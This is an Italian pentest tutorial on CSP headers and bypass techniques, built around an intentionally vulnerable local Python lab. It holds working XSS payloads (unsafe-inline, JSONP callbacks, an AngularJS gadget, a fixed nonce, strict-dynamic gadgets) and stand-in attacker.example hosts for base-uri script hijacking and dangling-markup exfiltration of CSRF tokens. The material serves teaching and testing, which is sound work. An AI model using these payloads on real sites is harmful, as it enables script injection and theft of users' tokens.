---
title: 'CSP Header e CSP Bypass: Pentest, Significato e Payload XSS'
slug: xss-csp-bypass
description: 'Cos''è il CSP header (Content Security Policy) e come aggirarlo nei pentest: unsafe-inline, nonce deboli, base-uri, JSONP, strict-dynamic e payload XSS.'
image: /csp-bypass-content-security-policy-pentesting.webp
draft: false
date: 2026-03-29T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - CSP Bypass
  - Content Security Policy
  - CSP Header
  - XSS
  - CSP Misconfiguration
---

# Content Security Policy (CSP): Significato, Analisi dell'Header e Bypass nei Pentest

La **CSP** è un meccanismo di sicurezza del browser che limita quali risorse una pagina può caricare ed eseguire: script, immagini, stili, frame, connessioni. Si attiva con l'header HTTP `Content-Security-Policy`, chiamato anche **CSP header**.

Il suo scopo principale è ridurre l'impatto delle [XSS](https://hackita.it/articoli/xss/): anche se un attaccante riesce a iniettare codice nella pagina, il browser rifiuta di eseguirlo se la policy non lo permette. In un pentest l'header si legge, si analizza e si cerca di aggirare: una CSP ben scritta ferma quasi tutto, ma la maggior parte di quelle reali ha almeno un buco.

In questa guida impari cosa significa CSP, come leggere un CSP header, come riconoscere le configurazioni sbagliate e come si aggirano, con un laboratorio locale su cui provare ogni tecnica.

## Cosa significa CSP e a cosa serve

**CSP** è la sigla di `Content Security Policy`. Il significato è: politica di sicurezza dei contenuti. È una lista di regole che il server manda al browser insieme alla pagina. Il browser la applica a ogni risorsa che la pagina prova a caricare.

Serve a tre cose:

* **Ridurre l'impatto delle XSS**: gli script iniettati non partono se non rispettano la policy.
* **Controllare dove escono i dati**: limita le connessioni, le immagini e i form verso domini esterni.
* **Proteggere dal clickjacking**: la direttiva `frame-ancestors` decide chi può incorniciare la pagina in un `iframe` (vedi [clickjacking](https://hackita.it/articoli/clickjacking/)).

Cosa **non** fa: non corregge la vulnerabilità XSS, che resta nel codice. La CSP è una seconda linea di difesa. Anche per questo conviene capire quali bypass esistono.

## CSP header: come funziona l'header HTTP

Il server manda l'header nella risposta. Il browser lo legge prima di eseguire qualsiasi cosa nella pagina:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

Con questa policy il browser esegue solo script che arrivano dalla stessa origine (`'self'`) o da `cdn.example.com`. Tutto il resto viene bloccato e l'errore compare nella console.

![CSP header: how the browser enforces a Content Security Policy](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgOTAwIDQ0MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBmb250LWZhbWlseT0iQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CiAgPGRlZnM+CiAgICA8bWFya2VyIGlkPSJhcnJvdyIgdmlld0JveD0iMCAwIDEwIDEwIiByZWZYPSI5IiByZWZZPSI1IiBtYXJrZXJXaWR0aD0iOCIgbWFya2VySGVpZ2h0PSI4IiBvcmllbnQ9ImF1dG8tc3RhcnQtcmV2ZXJzZSI+CiAgICAgIDxwYXRoIGQ9Ik0wLDAgTDEwLDUgTDAsMTAgeiIgZmlsbD0iI2ZmZmZmZiIvPgogICAgPC9tYXJrZXI+CiAgICA8bWFya2VyIGlkPSJhcnJvd1JlZCIgdmlld0JveD0iMCAwIDEwIDEwIiByZWZYPSI5IiByZWZZPSI1IiBtYXJrZXJXaWR0aD0iOCIgbWFya2VySGVpZ2h0PSI4IiBvcmllbnQ9ImF1dG8tc3RhcnQtcmV2ZXJzZSI+CiAgICAgIDxwYXRoIGQ9Ik0wLDAgTDEwLDUgTDAsMTAgeiIgZmlsbD0iI2ZmMDEwMyIvPgogICAgPC9tYXJrZXI+CiAgPC9kZWZzPgogIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSI5MDAiIGhlaWdodD0iNDQwIiBmaWxsPSIjNmIwMDAxIi8+CiAgPHRleHQgeD0iNDUwIiB5PSIzNiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIyMiIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiI+SG93IGEgYnJvd3NlciBlbmZvcmNlcyBhIENTUCBoZWFkZXI8L3RleHQ+CiAgPHJlY3QgeD0iNDAiIHk9IjcwIiB3aWR0aD0iMzAwIiBoZWlnaHQ9IjEyMCIgcng9IjgiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgPHRleHQgeD0iMTkwIiB5PSIxMDQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTgiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiPlNlcnZlciByZXNwb25zZTwvdGV4dD4KICA8dGV4dCB4PSIxOTAiIHk9IjEzNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjQwMCIgZmlsbD0iI2ZmZmZmZiI+Q29udGVudC1TZWN1cml0eS1Qb2xpY3k6PC90ZXh0PgogIDx0ZXh0IHg9IjE5MCIgeT0iMTU4IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjE1IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmYwMTAzIj5zY3JpcHQtc3JjICdzZWxmJzwvdGV4dD4KICA8cmVjdCB4PSI1NDAiIHk9IjcwIiB3aWR0aD0iMzIwIiBoZWlnaHQ9IjEyMCIgcng9IjgiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIzIi8+CiAgPHRleHQgeD0iNzAwIiB5PSIxMDQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTgiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZjAxMDMiPkJyb3dzZXI8L3RleHQ+CiAgPHRleHQgeD0iNzAwIiB5PSIxMzQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPmNoZWNrcyBldmVyeSBzY3JpcHQ8L3RleHQ+CiAgPHRleHQgeD0iNzAwIiB5PSIxNTYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPmFnYWluc3QgdGhlIHBvbGljeTwvdGV4dD4KICA8bGluZSB4MT0iMzQyIiB5MT0iMTMwIiB4Mj0iNTM4IiB5Mj0iMTMwIiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMi41IiBtYXJrZXItZW5kPSJ1cmwoI2Fycm93KSIvPgogIDx0ZXh0IHg9IjQ0MCIgeT0iMTE4IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iNjAwIiBmaWxsPSIjZmZmZmZmIj5IVFRQIGhlYWRlcjwvdGV4dD4KICA8bGluZSB4MT0iNjQwIiB5MT0iMTkyIiB4Mj0iMTcwIiB5Mj0iMjYyIiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiLz4KICA8bGluZSB4MT0iNzAwIiB5MT0iMTkyIiB4Mj0iNDUwIiB5Mj0iMjYyIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWRhc2hhcnJheT0iNiw0IiBtYXJrZXItZW5kPSJ1cmwoI2Fycm93UmVkKSIvPgogIDxsaW5lIHgxPSI3NjAiIHkxPSIxOTIiIHgyPSI3MzAiIHkyPSIyNjIiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtZGFzaGFycmF5PSI2LDQiIG1hcmtlci1lbmQ9InVybCgjYXJyb3dSZWQpIi8+CiAgPHJlY3QgeD0iNDAiIHk9IjI2NCIgd2lkdGg9IjI2MCIgaGVpZ2h0PSIxMTAiIHJ4PSI4IiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIvPgogIDx0ZXh0IHg9IjE3MCIgeT0iMjk4IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjE0IiBmb250LXdlaWdodD0iNDAwIiBmaWxsPSIjZmZmZmZmIj5zY3JpcHQgc3JjIC9hcHAuanM8L3RleHQ+CiAgPHRleHQgeD0iMTcwIiB5PSIzMjAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPnNhbWUgb3JpZ2luPC90ZXh0PgogIDx0ZXh0IHg9IjE3MCIgeT0iMzUyIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjIwIiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIj5BTExPV0VEPC90ZXh0PgogIDxyZWN0IHg9IjMyMCIgeT0iMjY0IiB3aWR0aD0iMjYwIiBoZWlnaHQ9IjExMCIgcng9IjgiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgPHRleHQgeD0iNDUwIiB5PSIyOTgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTQiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPmlubGluZSBzY3JpcHQgYWxlcnQgMTwvdGV4dD4KICA8dGV4dCB4PSI0NTAiIHk9IjMyMCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjQwMCIgZmlsbD0iI2ZmZmZmZiI+bm8gdW5zYWZlLWlubGluZSwgbm8gbm9uY2U8L3RleHQ+CiAgPHRleHQgeD0iNDUwIiB5PSIzNTIiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMjAiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZjAxMDMiPkJMT0NLRUQ8L3RleHQ+CiAgPHJlY3QgeD0iNjAwIiB5PSIyNjQiIHdpZHRoPSIyNjAiIGhlaWdodD0iMTEwIiByeD0iOCIgZmlsbD0iIzAwMDAwMCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiLz4KICA8dGV4dCB4PSI3MzAiIHk9IjI5OCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9IjQwMCIgZmlsbD0iI2ZmZmZmZiI+c2NyaXB0IGZyb20gYXR0YWNrZXIuZXhhbXBsZTwvdGV4dD4KICA8dGV4dCB4PSI3MzAiIHk9IjMyMCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjQwMCIgZmlsbD0iI2ZmZmZmZiI+b3RoZXIgb3JpZ2luPC90ZXh0PgogIDx0ZXh0IHg9IjczMCIgeT0iMzUyIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjIwIiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmYwMTAzIj5CTE9DS0VEPC90ZXh0PgogIDx0ZXh0IHg9IjQ1MCIgeT0iNDEyIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjE0IiBmb250LXdlaWdodD0iNDAwIiBmaWxsPSIjZmZmZmZmIj5FdmVyeSB2aW9sYXRpb24gaXMgbG9nZ2VkIGluIHRoZSBicm93c2VyIGNvbnNvbGU8L3RleHQ+Cjwvc3ZnPgo=)

La policy è un elenco di **direttive** separate da `;`. Ogni direttiva controlla un tipo di risorsa e contiene una lista di **sorgenti** (host, schemi come `https:`, parole chiave tra apici).

| Direttiva         | Cosa controlla                                    | Eredita da `default-src`? |
| ----------------- | ------------------------------------------------- | ------------------------- |
| `default-src`     | Valore di riserva per le direttive di caricamento | —                         |
| `script-src`      | Da dove si caricano gli script                    | Sì                        |
| `style-src`       | Fogli di stile                                    | Sì                        |
| `img-src`         | Immagini                                          | Sì                        |
| `connect-src`     | `fetch`, XHR, WebSocket, `sendBeacon`             | Sì                        |
| `frame-src`       | Contenuti caricati negli `iframe`                 | Sì                        |
| `object-src`      | Tag `<object>` ed `<embed>`                       | Sì                        |
| `base-uri`        | Il tag `<base>`                                   | **No**                    |
| `form-action`     | Dove possono inviare i dati i form                | **No**                    |
| `frame-ancestors` | Chi può incorniciare la pagina                    | **No**                    |

La colonna a destra è il dettaglio che fa la differenza: `default-src` copre solo le direttive di caricamento risorse (le *fetch directives*). `base-uri`, `form-action` e `frame-ancestors` **non** ereditano nulla: se mancano, sono liberi anche con un `default-src 'none'`. Ne vedrai le conseguenze nei bypass.

Le sorgenti più importanti:

| Sorgente           | Significato                                                             |
| ------------------ | ----------------------------------------------------------------------- |
| `'self'`           | Stessa origine della pagina                                             |
| `'none'`           | Nessuna sorgente permessa                                               |
| `'unsafe-inline'`  | Permette script e stili inline (indebolisce molto la policy)            |
| `'unsafe-eval'`    | Permette `eval()` e funzioni che eseguono stringhe                      |
| `'nonce-...'`      | Permette solo gli script con quel valore casuale nell'attributo `nonce` |
| `'sha256-...'`     | Permette solo lo script il cui hash corrisponde                         |
| `'strict-dynamic'` | Gli script fidati possono caricarne altri                               |
| `https:` / `data:` | Qualsiasi risorsa con quello schema                                     |

## Content-Security-Policy: esempio di configurazione solida

Questa è una policy rigida, vicina a quella consigliata oggi per le applicazioni nuove:

```http
Content-Security-Policy: default-src 'none'; script-src 'nonce-r4nd0m123' 'strict-dynamic'; style-src 'self'; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
```

Cosa dice, direttiva per direttiva:

| Direttiva                                 | Effetto                                                     |
| ----------------------------------------- | ----------------------------------------------------------- |
| `default-src 'none'`                      | Parte da "tutto vietato"                                    |
| `script-src 'nonce-...' 'strict-dynamic'` | Solo gli script con il nonce giusto (e quelli che caricano) |
| `style-src 'self'`                        | Solo CSS dalla stessa origine                               |
| `img-src 'self' data:`                    | Immagini locali e `data:`                                   |
| `connect-src 'self'`                      | `fetch` e WebSocket solo verso la stessa origine            |
| `object-src 'none'`                       | Niente `<object>` e `<embed>`                               |
| `base-uri 'none'`                         | Il tag `<base>` non può cambiare gli URL relativi           |
| `form-action 'self'`                      | I form possono inviare solo alla stessa origine             |
| `frame-ancestors 'none'`                  | La pagina non può essere incorniciata                       |

Il nonce deve essere un valore casuale **nuovo a ogni risposta**. Se il valore dell'esempio fosse fisso, la policy sarebbe inutile (vedi il bypass sui nonce).

### CSP Report-Only vs Content-Security-Policy

Esiste una seconda versione dell'header: `Content-Security-Policy-Report-Only`. Applica le stesse regole, ma **non blocca niente**: registra le violazioni e basta.

```http
Content-Security-Policy-Report-Only: script-src 'self'; report-to csp-endpoint
```

Si usa per testare una policy prima di attivarla. Per te in un pentest è un segnale importante: se la CSP è solo in modalità Report-Only, **non protegge**, e un'iniezione di script funziona come se la policy non ci fosse. Controlla sempre il nome esatto dell'header.

### Nonce, hash e strict-dynamic

Una policy basata su host (`script-src https://cdn.example.com`) si chiama *allowlist*. È fragile, perché basta una risorsa sbagliata su un host consentito per aggirarla. Per questo oggi si preferiscono **nonce** e **hash**:

* **Nonce**: l'header contiene `'nonce-XYZ'` e solo i tag `<script nonce="XYZ">` partono. Il valore cambia a ogni risposta.
* **Hash**: l'header contiene `'sha256-...'` e parte solo lo script con quel contenuto esatto. Ideale per script inline fissi.
* **`'strict-dynamic'`**: gli script fidati (con nonce o hash) possono caricare altri script. Quando c'è, i browser moderni ignorano gli host e `'self'` nella stessa direttiva.

Un dettaglio che serve nei test: quando `script-src` contiene un nonce o un hash, i browser moderni **ignorano `'unsafe-inline'`**. Una policy con `'unsafe-inline'` più un nonce valido blocca quindi gli script inline senza nonce.

```bash
# CSP hash of an inline script: base64 of the SHA-256 of the exact script content
printf '%s' 'alert(1)' | openssl dgst -sha256 -binary | openssl base64
```

## Come analizzare un CSP header: curl, Burp e DevTools

Appena trovi un'iniezione e la pagina ha una CSP, la prima cosa è leggere l'header. Tre modi:

```bash
# Show only the CSP headers of a real site (GET request, body discarded)
curl -s -D - -o /dev/null https://github.com | grep -i "content-security-policy"
```

* **Burp Suite**: nella scheda *HTTP history* apri la risposta e guarda gli header (vedi [Burp Suite](https://hackita.it/articoli/burp-suite/)).
* **DevTools del browser**: scheda *Network*, clicca la richiesta, poi *Headers*. Nella *Console* compaiono le violazioni, per esempio *Refused to execute inline script because it violates the following Content Security Policy directive*.

Cose da controllare:

* **CSP assente**: nessuna protezione.
* **Solo `Content-Security-Policy-Report-Only`**: nessuna protezione effettiva.
* **Più header CSP**: il browser applica **tutti**, quindi vale l'intersezione (la più restrittiva per ogni risorsa).
* **Tag `<meta http-equiv="Content-Security-Policy">`**: funziona, ma `frame-ancestors`, `report-uri` e `sandbox` non sono supportati da lì.
* **Pagine diverse, policy diverse**: controlla le pagine con l'iniezione, non solo la home.

## CSP misconfiguration: cosa cercare, in ordine

Prima di provare payload, fai una valutazione veloce. Incolla l'header nel [CSP Evaluator](https://csp-evaluator.withgoogle.com/) di Google: ti segnala i problemi più comuni. Poi verifica a mano:

| Cosa cercare                              | Perché è un problema                       |
| ----------------------------------------- | ------------------------------------------ |
| `'unsafe-inline'` senza nonce o hash      | Gli script inline partono                  |
| `'unsafe-eval'`                           | `eval()` e simili permessi                 |
| `*`, `https:`, `data:` in `script-src`    | Si carica script da qualsiasi origine      |
| Host con JSONP o librerie vecchie         | Esecuzione di codice tramite l'host fidato |
| `'self'` con upload o endpoint riflessi   | Si può servire codice dalla stessa origine |
| Nonce fisso o prevedibile                 | Il nonce si riusa                          |
| `object-src` mancante senza `default-src` | Contenuti plugin permessi                  |
| `base-uri` mancante                       | Si cambiano gli URL relativi               |
| `form-action` mancante                    | I form possono inviare dati fuori          |
| Header solo in modalità Report-Only       | Non c'è blocco                             |

## Laboratorio CSP bypass

Per provare le tecniche serve un server con policy diverse su rotte diverse. Crea due cartelle e il server vulnerabile:

```bash
# Create the lab folders
mkdir -p csp-lab/server csp-lab/attacker/js

# Script served by the attacker server (port 8011)
echo 'alert("attacker script running on origin: " + document.domain);' > csp-lab/attacker/js/app.js

# Vulnerable server (port 8010): every route has a different CSP and reflects ?q= without escaping
cat > csp-lab/server/csp_lab.py <<'EOF'
import json
import secrets
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

STATIC_NONCE = "abc123"
STRICT_POLICY = (
    "default-src 'none'; script-src 'nonce-{n}' 'strict-dynamic'; "
    "object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'"
)
PAGE = (
    "<!doctype html><html><head><title>CSP lab</title></head><body>"
    "<h1>CSP lab</h1><p>{q}</p>{extra}</body></html>"
)
LOGIN_FORM = (
    '<form action="/login" method="post">'
    '<input type="hidden" name="csrf" value="tok-7f3a">'
    '<input name="user" value="admin"><input type="submit" value="Login">'
    "</form>"
)
GADGET = (
    '<script nonce="{n}">'
    'const loader = document.createElement("script");'
    'loader.src = new URLSearchParams(location.search).get("module");'
    "document.body.appendChild(loader);"
    "</script>"
)


class CspLab(BaseHTTPRequestHandler):
    def send_body(self, content_type, body, csp_name=None, csp_value=None):
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        if csp_name:
            self.send_header(csp_name, csp_value)
        self.end_headers()
        self.wfile.write(body.encode())

    def do_GET(self):
        url = urlparse(self.path)
        params = parse_qs(url.query)
        q = params.get("q", [""])[0]
        nonce = secrets.token_urlsafe(16)
        header = "Content-Security-Policy"
        extra = ""

        if url.path == "/jsonp":
            # Same-origin JSONP endpoint: the callback name is not validated
            callback = params.get("callback", ["callback"])[0]
            return self.send_body("application/javascript", callback + "(" + json.dumps({"user": "admin"}) + ")")
        if url.path == "/js/app.js":
            return self.send_body("application/javascript", 'console.log("legit app.js from the real server");')

        if url.path == "/inline":
            policy = "script-src 'self' 'unsafe-inline'"
        elif url.path == "/self":
            policy = "default-src 'self'"
        elif url.path == "/nonce-base":
            # No base-uri directive, and a relative script src after the injection point
            policy = f"script-src 'nonce-{nonce}'"
            extra = f'<script nonce="{nonce}" src="js/app.js"></script>'
        elif url.path == "/nonce-static":
            # The nonce never changes between responses
            nonce = STATIC_NONCE
            policy = f"script-src 'nonce-{nonce}'"
            extra = f'<script nonce="{nonce}">console.log("legit inline script");</script>'
        elif url.path == "/report-only":
            header = "Content-Security-Policy-Report-Only"
            policy = "script-src 'self'"
        elif url.path == "/strict":
            policy = STRICT_POLICY.format(n=nonce)
            extra = f'<script nonce="{nonce}">console.log("legit inline script");</script>'
        elif url.path == "/gadget":
            # Strict policy, but a trusted script loads a module chosen by the URL
            policy = STRICT_POLICY.format(n=nonce)
            extra = GADGET.format(n=nonce)
        elif url.path == "/no-form-action":
            # default-src does not cover form-action
            policy = "default-src 'self'"
            extra = LOGIN_FORM
        elif url.path == "/monitored":
            # Blocking policy that also sends violation reports to the collector on port 8012
            policy = "default-src 'self'; report-uri http://127.0.0.1:8012/csp-report"
        else:
            self.send_response(404)
            self.end_headers()
            return

        self.send_body("text/html; charset=utf-8", PAGE.format(q=q, extra=extra), header, policy)


HTTPServer(("127.0.0.1", 8010), CspLab).serve_forever()
EOF
```

Avvia i due server, uno per terminale:

```bash
# Terminal 1: vulnerable CSP lab (http://127.0.0.1:8010)
python3 csp-lab/server/csp_lab.py
```

```bash
# Terminal 2: attacker server (http://127.0.0.1:8011), its log shows the stolen data
cd csp-lab/attacker && python3 -m http.server 8011
```

Controlla le policy di ogni rotta:

```bash
# Print the CSP header returned by each lab route
for route in inline self nonce-base nonce-static report-only strict gadget no-form-action monitored; do
  echo "== /$route"
  curl -s -D - -o /dev/null "http://127.0.0.1:8010/$route" | grep -i "content-security-policy"
done
```

I payload qui sotto si incollano nella barra degli indirizzi del browser. Guarda sempre anche la **Console** di DevTools: lì vedi quando la CSP blocca qualcosa.

## Tecniche di CSP bypass durante un penetration test

### 1. `'unsafe-inline'` presente

```http
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

Se non ci sono nonce o hash nella stessa direttiva, qualsiasi script inline parte:

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
```

Prova sul laboratorio:

```
http://127.0.0.1:8010/inline?q=<script>alert(document.domain)</script>
```

È la configurazione più comune nelle CSP reali: ci resta per "compatibilità" con il codice vecchio. Attenzione alla precisazione: con un nonce o un hash valido nella stessa `script-src`, i browser moderni ignorano `'unsafe-inline'`, quindi non è più un bypass.

### 2. `'unsafe-eval'` presente

```http
Content-Security-Policy: script-src 'self' 'unsafe-eval'
```

Permette `eval()`, `setTimeout(stringa)`, `setInterval(stringa)` e `new Function()`. Serve un punto in cui l'app passa input a una di queste funzioni (tipico in una [DOM XSS](https://hackita.it/articoli/dom-xss/)):

```javascript
// Sinks that execute strings: allowed when unsafe-eval is present
eval('alert(document.domain)')
setTimeout('alert(document.domain)', 0)
new Function('alert(document.domain)')()
```

### 3. Wildcard, `https:` e `data:` in `script-src`

```http
Content-Security-Policy: script-src *.example.com
```

La wildcard accetta **qualsiasi sottodominio**. Se ne controlli uno (anche con un [subdomain takeover](https://hackita.it/articoli/subdomain-takeover/)) la CSP è aggirata.

```http
Content-Security-Policy: script-src https:
```

`https:` accetta script da qualsiasi sito HTTPS, incluso il tuo:

```html
<script src="https://attacker.example/xss.js"></script>
```

Se c'è `data:`, bastano i dati dentro l'URL:

```html
<script src="data:,alert(document.domain)"></script>
```

### 4. `script-src 'self'`: codice dalla stessa origine

`'self'` sembra sicuro, ma permette qualsiasi script servito dalla stessa origine. Se riesci a far servire codice tuo da lì, la CSP non ti ferma. Tre modi:

* **Endpoint JSONP o riflesso sulla stessa origine**: un URL che restituisce `funzione(dati)` con il nome della funzione scelto da te.
* **Upload di file**: carichi un file `.js` e lo carichi con `<script src>` (vedi [file upload attack](https://hackita.it/articoli/file-upload-attack/)).
* **Risposte con contenuto controllabile** che il browser interpreta come JavaScript.

Prova sul laboratorio (policy `default-src 'self'`: lo script inline viene bloccato, quello da `/jsonp` no):

```
http://127.0.0.1:8010/self?q=<script>alert(1)</script>
http://127.0.0.1:8010/self?q=<script src="/jsonp?callback=alert(document.domain)//"></script>
```

Nel primo caso la console segnala la violazione. Nel secondo parte `alert(document.domain)//({"user": "admin"})`: il `//` commenta il resto.

### 5. CDN in allowlist: JSONP e librerie vecchie

Molte app mettono in allowlist un CDN:

* `ajax.googleapis.com`
* `cdn.jsdelivr.net`
* `unpkg.com`
* `cdnjs.cloudflare.com`
* `code.jquery.com`

Se un host consentito ospita un endpoint JSONP o una libreria vecchia, la policy non vale più. Esempio classico con AngularJS (versioni vecchie, come la 1.0.1) caricato da un CDN consentito:

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

Gli endpoint JSONP dei CDN comuni li trovi in [JSONBee](https://github.com/zigoo0/JSONBee). Ricerche pubblicate sulle CSP reali hanno mostrato che la grande maggioranza di quelle basate solo su allowlist è aggirabile: per questo la raccomandazione moderna è nonce o hash con `strict-dynamic`.

### 6. Path restriction e open redirect sull'host consentito

Una policy come `script-src https://cdn.example.com/trusted/` limita anche il percorso. Ma dopo un **redirect** il browser controlla solo l'origine, non il percorso. Se sull'host consentito c'è un [open redirect](https://hackita.it/articoli/open-redirect/) verso un altro percorso dello stesso host, puoi caricare un file fuori da `/trusted/`:

```html
<script src="https://cdn.example.com/redirect?to=/uploads/evil.js"></script>
```

### 7. `object-src` mancante

Questo bypass si descrive spesso in modo sbagliato. `object-src` **eredita da `default-src`**: con `default-src 'self'` o `'none'` la direttiva è già coperta. Il caso reale è una policy **senza `default-src` e senza `object-src`**:

```http
Content-Security-Policy: script-src 'nonce-abc123'
```

Qui i tag `<object>` ed `<embed>` non sono limitati e possono caricare contenuti che eseguono codice (storicamente plugin e PDF). I browser moderni hanno ridotto molto questa superficie e il vecchio payload `<object data=javascript:alert(1)>` non funziona più, ma gli strumenti di valutazione lo segnalano comunque: aggiungi sempre `object-src 'none'`.

### 8. `base-uri` mancante

`base-uri` **non** eredita da `default-src`: se manca, puoi cambiare l'URL base della pagina. Se dopo il punto di iniezione c'è uno script con percorso relativo e con un nonce valido, il browser lo cerca sul tuo server **mantenendo il nonce**:

```html
<!-- Injected before the legitimate script -->
<base href="https://attacker.example/">
<!-- Existing page tag: now loads https://attacker.example/js/app.js with a valid nonce -->
<script nonce="abc123" src="js/app.js"></script>
```

Prova sul laboratorio. La rotta `/nonce-base` ha un nonce nuovo a ogni risposta, nessun `base-uri` e uno script relativo dopo il punto di iniezione:

```
http://127.0.0.1:8010/nonce-base?q=<base href="http://127.0.0.1:8011/">
```

La pagina carica `http://127.0.0.1:8011/js/app.js` e mostra l'`alert` con `127.0.0.1`. Serve poter iniettare HTML **prima** dello script. Se invece apri `/strict` con lo stesso payload, il `<base>` viene ignorato grazie a `base-uri 'none'`.

### 9. Nonce deboli, riusati o aggirati

Il nonce vale solo se è casuale e nuovo a ogni risposta. I casi reali:

* **Nonce fisso**: lo leggi dal sorgente e lo usi nel tuo script.
* **Nonce prevedibile**: derivato da timestamp, contatore o da un generatore debole.
* **Pagina in cache**: se un CDN o una cache serve la stessa pagina a più utenti, tutti ricevono lo stesso nonce. Un nonce letto da una risposta in cache vale per le altre.
* **Iniezione dentro uno script che ha già il nonce**: se l'input finisce dentro un `<script nonce>` esistente (per esempio in una stringa JSON), esci dalla stringa ed esegui codice nello stesso tag.

Un nonce rubato dalla risposta **corrente** (con dangling markup, per esempio) non serve a nulla da solo: vale solo per quella risposta. Diventa utile soltanto se viene riusato.

Verifica la differenza sul laboratorio:

```bash
# /nonce-base changes the nonce on every response
for i in 1 2 3; do curl -s -D - -o /dev/null http://127.0.0.1:8010/nonce-base | grep -i "content-security-policy"; done

# /nonce-static always returns the same nonce
for i in 1 2 3; do curl -s -D - -o /dev/null http://127.0.0.1:8010/nonce-static | grep -i "content-security-policy"; done
```

Con il nonce fisso l'attacco è immediato:

```
http://127.0.0.1:8010/nonce-static?q=<script nonce="abc123">alert(document.domain)</script>
```

Con `'strict-dynamic'` c'è un altro caso: se uno script fidato (con nonce) crea un nuovo script con un indirizzo che decidi tu, `strict-dynamic` lo autorizza. Il laboratorio ha una pagina con questo **gadget** e una policy rigida:

```
http://127.0.0.1:8010/gadget?module=http://127.0.0.1:8011/js/app.js
```

L'`alert` parte anche se la policy è quella "buona": il bypass è nel codice dell'app, non nella CSP.

### 10. Modalità Report-Only

Se l'header è `Content-Security-Policy-Report-Only` la policy non blocca nulla. Sul laboratorio:

```
http://127.0.0.1:8010/report-only?q=<script>alert(document.domain)</script>
```

L'`alert` parte e la console scrive solo un messaggio con `[Report Only]`.

### 11. `form-action` mancante e dangling markup

Quando non puoi eseguire JavaScript ma puoi iniettare HTML, ti resta l'esfiltrazione. `default-src` **non** copre `form-action`: se manca, un form può inviare i dati ovunque. Se inietti un tag `<form>` aperto prima di un form esistente, il parser HTML ignora il secondo `<form>`. I campi del form originale (token CSRF compreso) finiscono nel tuo form:

```html
<form action="https://attacker.example/log" method="get">
```

